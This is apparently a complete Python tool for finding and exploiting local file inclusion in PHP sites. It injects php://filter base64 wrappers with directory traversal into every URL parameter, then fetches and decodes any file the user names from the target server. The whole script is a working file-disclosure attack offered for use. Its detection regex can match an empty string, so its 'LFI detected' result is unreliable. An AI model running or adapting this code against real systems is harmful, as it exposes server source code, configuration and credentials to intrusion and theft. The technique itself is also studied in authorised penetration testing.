import re
import base64
import requests
import urllib.parse

from rich.console import Console
from rich.progress import Progress

class PHPFilterChecker:
    def __init__(self, url, depth=10, silent=False):
        self.url = url
        self.depth = depth
        self.silent = silent
        self.success_depth = None
        self.base64_content = None

    def filter_check(self, filename='index.php'):
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        file_paths = []

        for i in range(self.depth):
            encoded_path = urllib.parse.quote('../' * i + filename)
            file_paths.append(('php://filter/convert.base64-encode/resource=' + encoded_path, re.compile(r'(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?')))

        console = Console()
        total_operations = len(params.keys()) * len(file_paths)

        if not self.silent:
            with Progress(console=console) as progress:
                return self._scan(params, file_paths, parsed_url, console, total_operations, progress)

        return self._scan(params, file_paths, parsed_url, console)

    def _scan(self, params, file_paths, parsed_url, console, total_operations=None, progress=None):
        task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None

        for param_name in params.keys():
            for i, (file_path, file_regex) in enumerate(file_paths):
                new_params = params.copy()
                new_params[param_name] = file_path
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                response = requests.get(fuzzed_url)

                match = file_regex.search(response.text)
                if match:
                    if not self.silent:
                        console.print(f'\n[bold red]Possible LFI detected (php_filter: method)[/bold red]', style='bold red')
                        print(match.group(0))
                    self.success_depth = i
                    self.base64_content = match.group(0)
                    return True
                
                if progress:
                    progress.update(task, advance=1)

        return False

    def exploit(self, filename):
        if self.success_depth is None:
            print("No successful LFI detected to exploit.")
            return False

        try:
            parsed_url = urllib.parse.urlparse(self.url)
            params = urllib.parse.parse_qs(parsed_url.query)
            encoded_path = urllib.parse.quote('../' * self.success_depth + filename)
            new_params = params.copy()
            for param in new_params:
                new_params[param] = 'php://filter/convert.base64-encode/resource=' + encoded_path
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
            response = requests.get(fuzzed_url)
            
            base64_regex = re.compile(r'(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?')

            match = base64_regex.search(response.text)
            
            if match:
                base64_content = match.group(0)
                try:
                    decoded_response = base64.b64decode(base64_content).decode("utf-8")
                    print(f"Decoded file content: \n {decoded_response}")
                except:
                    print(f"Failed to decode the base64 content. Displaying raw content: \n {base64_content}")
            else:
                print(f"No base64 content found. Displaying raw content: \n {response.text}")
            return True
        except:
            print("Failed to exploit the LFI.")
            return False



def main():
    url = input('Enter site URL to test: ')
    filename = input('Enter filename to display: ')
    checker = PHPFilterChecker(url, silent=False)
    result = checker.filter_check()
    print(f"LFI detected: {result}")
    if result:
        checker.exploit(filename)

if __name__ == "__main__":
    main()
